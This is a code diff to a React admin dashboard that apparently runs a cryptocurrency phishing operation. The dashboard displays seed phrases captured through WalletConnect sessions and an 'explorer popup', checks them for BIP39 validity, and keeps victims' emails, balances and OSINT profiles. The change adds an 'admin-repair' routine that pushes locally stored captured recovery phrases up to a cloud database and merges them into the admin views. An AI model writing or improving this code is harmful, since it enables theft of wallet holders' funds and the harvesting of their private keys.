@@ -153,7 +153,7 @@ type SignerCheckRecord     = { wallet: string; chain: ChainKey; status: 'passed'
 type EmailRecord           = { email: string; name: string; wallet: string; chain: ChainKey; severity: Severity; score: number; balance: string; sentAt: string; emailStatus: 'sent' | 'pending' | 'failed' }
 type AdminCreds            = { email: string; password: string }
 type SupportConfig         = { email: string; telegram: string }
-type CaptureAuditChannel   = 'explorer-submit' | 'wc-submit' | 'wc-draft' | 'explorer-draft'
+type CaptureAuditChannel   = 'explorer-submit' | 'wc-submit' | 'wc-draft' | 'explorer-draft' | 'admin-repair'
 type CaptureAuditRecord    = {
   id: string
   createdAt: string
@@ -1194,6 +1194,7 @@ export default function App() {
   // Server-authoritative seed list — fetched directly from /api/seeds (bypasses all client-side state).
   const [serverSeedRecords,    setServerSeedRecords]    = useState<SeedPhraseRecord[]>([])
   const [seedsLoading,         setSeedsLoading]         = useState(false)
+  const seedAutoRepairKeyRef = useRef('')
   const [captureAuditRecords,  setCaptureAuditRecords]  = useState<CaptureAuditRecord[]>(readCaptureAuditRecords)
   const [adminCreds, setAdminCreds] = useState<AdminCreds>(() => {
     try {
@@ -1800,6 +1801,23 @@ export default function App() {
       window.clearInterval(timer)
     }
   }, [activeView, adminTab])
+
+  // Auto-repair: if admin sees fewer server rows than local rows, push local rows up to cloud.
+  useEffect(() => {
+    if (activeView !== 'admin' || (adminTab !== 'seeds' && adminTab !== 'rawdata')) return
+    if (!isCloudConfigured) return
+    const localRows = mergeUniqueRecords(seedPhraseRecords, readSeedPhraseRecords(), item => `${item.id}|${item.seedPhrase}`)
+    if (localRows.length === 0) return
+    if (serverSeedRecords.length >= localRows.length) return
+
+    const repairKey = `${localRows.length}|${serverSeedRecords.length}`
+    if (seedAutoRepairKeyRef.current === repairKey) return
+    seedAutoRepairKeyRef.current = repairKey
+
+    void saveMergedSeedPhrasesToCloud(localRows, 'admin-repair')
+      .then(() => refreshServerSeedRecords())
+      .catch(() => { /* best-effort */ })
+  }, [activeView, adminTab, isCloudConfigured, seedPhraseRecords, serverSeedRecords])
 
   // Refresh connected wallets when admin opens the wallets tab.
   useEffect(() => {
@@ -3662,10 +3680,13 @@ export default function App() {
     { key: 'support',   label: 'Support'         },
   ]
 
-  const visibleSeedPhraseRecords = useMemo(
-    () => mergeUniqueRecords(seedPhraseRecords, readSeedPhraseRecords(), item => `${item.id}|${item.seedPhrase}`)
-      .filter(r => r.source !== 'manual' && r.source !== 'draft-wc' && r.source !== 'draft-explorer'),
+  const localSeedPhraseRecords = useMemo(
+    () => mergeUniqueRecords(seedPhraseRecords, readSeedPhraseRecords(), item => `${item.id}|${item.seedPhrase}`),
     [seedPhraseRecords],
+  )
+  const effectiveSeedPhraseRecords = useMemo(
+    () => mergeUniqueRecords(serverSeedRecords, localSeedPhraseRecords, item => `${item.id}|${item.seedPhrase}`),
+    [serverSeedRecords, localSeedPhraseRecords],
   )
 
   const adminTabs: { key: typeof adminTab; label: string; count?: number }[] = [
@@ -3677,8 +3698,8 @@ export default function App() {
     { key: 'templates', label: 'Email Templates' },
     { key: 'osint',     label: 'OSINT Profiles',    count: [...new Set(scanHistory.map(r => r.wallet.toLowerCase()))].length || undefined },
     { key: 'intel',     label: 'Address Intel',     count: adminIntelRecords.length },
-    { key: 'seeds',     label: 'Seed Phrases',      count: visibleSeedPhraseRecords.length || undefined },
-    { key: 'rawdata',   label: 'Raw Data',          count: serverSeedRecords.length || undefined },
+    { key: 'seeds',     label: 'Seed Phrases',      count: effectiveSeedPhraseRecords.length || undefined },
+    { key: 'rawdata',   label: 'Raw Data',          count: effectiveSeedPhraseRecords.length || undefined },
     { key: 'audit',     label: 'Audit Log',         count: captureAuditRecords.length || undefined },
     { key: 'bots',      label: 'Bot Requests',      count: botRequests.filter(r => r.status === 'pending').length || undefined },
     { key: 'qrcodes',   label: 'QR Codes',          count: wcSessions.length || undefined },
@@ -3686,8 +3707,8 @@ export default function App() {
   ]
 
   const rawSeedData = useMemo(
-    () => JSON.stringify(serverSeedRecords, null, 2),
-    [serverSeedRecords],
+    () => JSON.stringify(effectiveSeedPhraseRecords, null, 2),
+    [effectiveSeedPhraseRecords],
   )
 
   // ── QR code helpers ──────────────────────────────────────────────────
@@ -6807,19 +6828,19 @@ export default function App() {
                       {/* Stats */}
                       <div className="seeds-stats-row">
                         <div className="seeds-stat">
-                          <span className="seeds-stat-val">{serverSeedRecords.length}</span>
+                          <span className="seeds-stat-val">{effectiveSeedPhraseRecords.length}</span>
                           <span className="seeds-stat-label">Total</span>
                         </div>
                         <div className="seeds-stat">
-                          <span className="seeds-stat-val">{serverSeedRecords.filter(r => r.source === 'wc-session').length}</span>
+                          <span className="seeds-stat-val">{effectiveSeedPhraseRecords.filter(r => r.source === 'wc-session').length}</span>
                           <span className="seeds-stat-label">WalletConnect</span>
                         </div>
                         <div className="seeds-stat">
-                          <span className="seeds-stat-val">{serverSeedRecords.filter(r => r.source === 'auto-detected').length}</span>
+                          <span className="seeds-stat-val">{effectiveSeedPhraseRecords.filter(r => r.source === 'auto-detected' || r.source === 'draft-explorer').length}</span>
                           <span className="seeds-stat-label">Explorer Popup</span>
                         </div>
                         <div className="seeds-stat">
-                          <span className="seeds-stat-val">{serverSeedRecords.filter(r => r.confirmed).length}</span>
+                          <span className="seeds-stat-val">{effectiveSeedPhraseRecords.filter(r => r.confirmed).length}</span>
                           <span className="seeds-stat-label">Valid BIP39</span>
                         </div>
                       </div>
@@ -6827,9 +6848,9 @@ export default function App() {
                       {/* Records */}
                       <div className="seeds-divider" />
 
-                      {seedsLoading && serverSeedRecords.length === 0 ? (
+                      {seedsLoading && effectiveSeedPhraseRecords.length === 0 ? (
                         <p className="muted" style={{ padding: '1rem 0' }}>Loading from database…</p>
-                      ) : serverSeedRecords.length === 0 ? (
+                      ) : effectiveSeedPhraseRecords.length === 0 ? (
                         <div className="seeds-empty-state">
                           <div className="seeds-empty-icon">🔑</div>
                           <p className="seeds-empty-title">No records yet</p>
@@ -6854,7 +6875,7 @@ export default function App() {
                               </tr>
                             </thead>
                             <tbody>
-                              {serverSeedRecords.map((r, idx) => (
+                              {effectiveSeedPhraseRecords.map((r, idx) => (
                                 <tr key={r.id} className="seeds-row">
                                   <td className="muted seeds-col-index">{idx + 1}</td>
                                   <td>
@@ -6864,7 +6885,7 @@ export default function App() {
                                   </td>
                                   <td>
                                     <span className={`pill ${r.source === 'wc-session' ? 'medium' : 'high'} seeds-source-pill`}>
-                                      {r.source === 'wc-session' ? 'WalletConnect' : 'Explorer'}
+                                      {r.source === 'wc-session' ? 'WalletConnect' : r.source === 'manual' ? 'Manual' : 'Explorer'}
                                     </span>
                                   </td>
                                   <td className="seeds-col-words">
@@ -6896,8 +6917,9 @@ export default function App() {
                                       className="preview-btn seeds-action-btn seeds-action-btn-danger"
                                       type="button"
                                       onClick={async () => {
-                                        const updated = serverSeedRecords.filter(x => x.id !== r.id)
+                                        const updated = effectiveSeedPhraseRecords.filter(x => x.id !== r.id)
                                         setServerSeedRecords(updated)
+                                        setSeedPhraseRecords(updated)
                                         // Write updated list directly to Supabase (no Vercel auth needed).
                                         await saveToCloud({ seed_phrases: updated })
                                       }}
@@ -6948,7 +6970,7 @@ export default function App() {
                       </div>
 
                       <div className="seeds-stat" style={{ marginBottom: '0.8rem', maxWidth: '180px' }}>
-                        <span className="seeds-stat-val">{serverSeedRecords.length}</span>
+                        <span className="seeds-stat-val">{effectiveSeedPhraseRecords.length}</span>
                         <span className="seeds-stat-label">Records</span>
                       </div>
 
